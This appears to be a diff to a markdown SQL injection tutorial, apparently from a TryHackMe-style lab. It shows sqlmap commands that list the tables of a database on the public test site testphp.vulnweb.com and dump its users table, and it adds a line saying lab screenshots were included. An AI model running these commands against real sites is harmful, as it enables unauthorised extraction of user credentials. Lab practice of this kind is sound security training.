@@ -42,6 +42,14 @@ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
 # Step 4: Dump data from users table
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump
 
+---
+
+### Ihave also added screenshots from tryhackme lab which i performed myself in controlled lab enviroment :
+
+---
+
+
+
 
 
 
